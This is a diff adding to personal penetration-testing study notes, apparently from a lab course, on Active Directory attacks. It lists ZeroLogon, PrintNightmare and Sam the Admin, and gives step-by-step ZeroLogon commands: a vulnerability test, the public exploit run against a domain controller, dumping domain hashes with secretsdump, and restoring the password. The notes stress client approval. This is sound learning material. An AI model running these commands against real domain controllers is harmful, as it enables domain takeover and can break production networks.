@@ -1087,3 +1087,64 @@ from the Domain Controller -->  install [[cheet#Install mimikatz on victim machi
 - <span style="color:#00b050">gain access to THEPUNISHER machine</span> 
   example:
   `psexec.exe \\THEPUNISHER cmd.exe`
+
+### Additional AD Attacks
+- <span style="color:#00b050">ZeroLogon</span> -->  if you miss something in this attac
+- <span style="color:#00b050">PrintNightmare</span>
+- <span style="color:#00b050">Sam the Admin</span>
+
+it's worth checking for these vuln -->  but you shouldn't exploit them unless with client approves
+
+how to check:
+there are tools for checking if -->  a domain is affected by these vuln
+
+#### Abusing ZeroLogon
+It's a dangerous attack to run
+<span style="background:#fff88f">what is capable of doing:</span>
+- attacking a Domain Controller
+- setting the domain controller password -->  to <span style="color:#00b050">null</span>
+- take over the domain controller
+
+> [!warning] If you don't restore the password
+we will -->  break the Domain Controller
+
+- clone this [repo](https://github.com/dirkjanm/CVE-2020-1472)
+- you must have:
+	- the latest Impacket tool version
+	- python >= 3.7
+- cd the repo
+- save from this [repo](https://github.com/SecuraBV/CVE-2020-1472) -->  the `zerologon_tester.py` 
+- put it inside the first repo that you cloned
+- this script checks if the domain is vulnerable to Zerologon attack:
+  =>
+  `python3 zerologon_tester.py HYDRA-DC <domain controller IP>`
+  ![[Pasted image 20240304152050.png]]
+- in this way you can inform your client that:
+	- he is vulnerable to this attack
+	- he can fix it (without demonstrate with the real exploit)
+
+if you want to run the attack:
+- `python3 cve-2020-1472-exploit.py HYDRA-DC <domain controller IP>`
+  ![[Pasted image 20240304152439.png]]
+- to check if the script has changed the Domain Controller password:
+  `secretsdump.py -just-dc MARVEL/HYDRA-DC\$@<domain controller IP>`
+- at this point we own this Domain Controller
+
+<span style="background:#fff88f">How to restore to the previous password:</span>
+- copy the entire Administrator hash
+- `secretsdump.py administrator@<domain controller IP> -hashes <hash>`
+- search in the result -->  `MARVEL\HYDRA-DC$: plain_password_hex`
+- copy this value
+- `python3 restorepassword.py MARVEL/HYDRA-DC@HYDRA-DC -target-ip <domain controller IP> -hexpass <the previous copied value>`
+  ![[Pasted image 20240304152955.png]]
+- <span style="color:#00b050">password restored</span>
+
+#### PrintNightmare (CVE-2021-1675)
+This is a -->  post compromised attack
+
+This attack takes advantage of -->  <span style="color:#00b050">printer spooler</span>
+bc it allows:
+users to add printers that run as -->  <span style="color:#00b050">system privilege</span> 
+=>
+any authenticated attacker can -->  <span style="color:#00b050">code execution</span>
+
